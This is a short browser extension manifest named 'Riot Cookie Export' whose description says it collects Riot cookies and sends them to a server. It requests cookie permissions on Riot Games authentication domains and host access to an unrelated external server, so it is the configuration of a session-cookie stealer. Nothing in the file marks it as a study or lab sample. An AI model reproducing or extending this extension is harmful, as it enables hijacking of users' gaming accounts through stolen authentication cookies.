{
  "name": "Riot Cookie Export",
  "description": "Collect Riot cookies and send them to server",
  "version": "1.0",
  "manifest_version": 3,
  "permissions": ["cookies", "storage"],
  "host_permissions": [
    "https://auth.riotgames.com/*",
    "https://*.riotgames.com/*",
    "https://pure-cherrita-inosuke-6597cf0f.koyeb.app:8190/*"
  ],
  "action": {
    "default_popup": "popup.html"
  }
}
